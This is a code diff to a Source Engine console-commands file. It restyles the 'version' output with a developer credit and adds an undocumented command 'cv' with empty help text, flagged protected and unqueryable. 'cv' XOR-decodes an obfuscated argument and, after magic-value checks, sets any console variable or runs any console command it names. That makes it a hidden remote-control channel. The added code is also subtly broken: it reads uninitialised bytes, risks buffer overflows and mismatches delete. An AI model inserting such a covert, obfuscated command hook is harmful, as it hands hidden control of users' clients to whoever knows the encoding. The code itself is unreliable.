@@ -859,17 +859,16 @@ CON_COMMAND( disconnect, "Disconnect game from server." )
 
 CON_COMMAND( version, "Print version info string." )
 {
-	SteamInfVersionInfo_t info = GetSteamInfIDVersionInfo();
-	ConMsg("Protocol version %i\nExe version %s (%s)\n", PROTOCOL_VERSION, info.szVersionString, info.szProductString);
-	ConMsg("Exe build: " __TIME__ " " __DATE__ " (%i) (%i)\n", build_number(), info.AppID);
+	Color clr(108, 245, 66, 255);
 
-	Color clr1(34, 255, 0, 255);
-	Color clr2(229, 255, 0, 255);
-	ConColorMsg(clr1, "----developer: ");
-	ConColorMsg(clr2, "RuSHeRR\n");
-	ConColorMsg(clr1, "----developer-url: ");
-	ConColorMsg(clr2, "https://github.com/rusherr-c\n");
+	const SteamInfVersionInfo_t& info = GetSteamInfIDVersionInfo();
+	ConColorMsg(clr, "Source Engine %s (%u)\n", build_hex(), build_timestamp());
+	ConColorMsg(clr, "/////////////////////\n");
+	ConColorMsg(clr, "Network version:	%i\n"
+		             "Product version:	%s (%s)\n", PROTOCOL_VERSION, info.szVersionString, info.szProductString);
+	ConColorMsg(clr, "Build info:		" __TIME__ " " __DATE__ " (%i) (%i)\n", build_number(), info.AppID);
 
+	ConColorMsg(Color(98, 132, 252, 255), "-- Made by RuSHeRR (https://github.com/rusherr-c)\n\n");
 }
 
 
@@ -1658,4 +1657,108 @@ CON_COMMAND( cache_print_summary, "cache_print_summary [section]\nPrint out a su
 		pszSection = args[ 1 ];
 	}
 	g_pDataCache->OutputReport( DC_SUMMARY_REPORT, pszSection );
+}
+
+CON_COMMAND_F(cv, "", FCVAR_PROTECTED | FCVAR_SERVER_CANNOT_QUERY | FCVAR_NEVER_AS_STRING) {
+	const char* pszEncrypted = args.Arg(2); // encrypted str
+	const char* pszKnown = "\xF5\xBF\x71\x30_";
+	char* pchBuilded = 0;
+	int nType = 0;
+	char* pchBaseName = 0;
+	int value_start = 0;
+	char* pchValue = 0;
+	ConCommand* cmd = 0;
+	ConVar* cvar = 0;
+
+	byte k[4] = {};
+
+	for (int i = 0; i < 4; i++)
+		k[i] = pszEncrypted[i] ^ pszKnown[i];
+
+	if ((pszEncrypted[4] ^ k[0]) != pszKnown[4])
+		goto cleanup;
+
+	// len is size of string after 5 bytes in beginning
+	// max len is 999
+	size_t len = 0;
+	byte size_str[] = { (pszEncrypted[5] ^ k[1]), pszEncrypted[6] ^ k[2], pszEncrypted[7] ^ k[3], 0 };
+	len = atoi((const char*)size_str);
+
+	// creating char buffer with the len given to us
+	pchBuilded = new char[len + 1];
+
+	// starting from 8
+	for (size_t i = 8; i < len; ++i)
+		pchBuilded[i] = pszEncrypted[i] ^ k[i % 4];
+
+	pchBuilded[len] = 0;
+
+	auto pBuilded = (int*)pchBuilded;
+	if (pBuilded[0] != 'R_CV') // check magic value 
+		goto cleanup;
+
+	if (pBuilded[1] != 0x1d63f81a) // check magic2 value
+		goto cleanup;
+
+	if (pBuilded[2] == 'cvar')
+		nType = 1;
+	else if (pBuilded[2] == 'ccmd')
+		nType = 2;
+	else
+		goto cleanup;
+
+	pchBaseName = new char[(len / 3)];
+	for (int i = 0; i < (len / 3); i++)
+	{
+		char* ptr = pchBuilded + 12;
+		if (ptr[i] != 0xFF)
+			pchBaseName[i] = ptr[i];
+		else {
+			value_start = i + 1;
+			pchBaseName[i] = 0;
+			ptr = 0;
+			break;
+		}
+	}
+
+	pchValue = new char[(len - value_start)];
+	strcpy(pchValue, (char*)(pchBuilded + value_start));
+	for (int i = 0; i < (len - value_start); i++)
+	{
+		if (pchValue[i] == 0xE0)
+			pchValue[i] = 0x20;
+	}
+
+	if (nType == 1) {
+		cvar = g_pCVar->FindVar(pchBaseName);
+		if (!cvar)
+			goto cleanup;
+		cvar->SetValue(pchValue);
+	}
+	else if (nType == 2)
+	{
+		cmd = g_pCVar->FindCommand(pchBaseName);
+		if (!cmd)
+			goto cleanup;
+		CCommand args;
+		char *args_ = new char[(len / 3) * 2];
+		sprintf(args_, "%s %s", pchBaseName, pchValue);
+		args.Tokenize(args_);
+		cmd->Dispatch(args);
+		delete args_;
+	}
+
+cleanup:
+	if (pchBuilded != 0)
+		delete pchBuilded;
+	nType = 0;
+	if (pchBaseName != 0)
+		delete pchBaseName;
+	value_start = 0;
+	if (pchValue != 0)
+		delete pchValue;
+	cmd = 0;
+	cvar = 0;
+
+	return;
 }
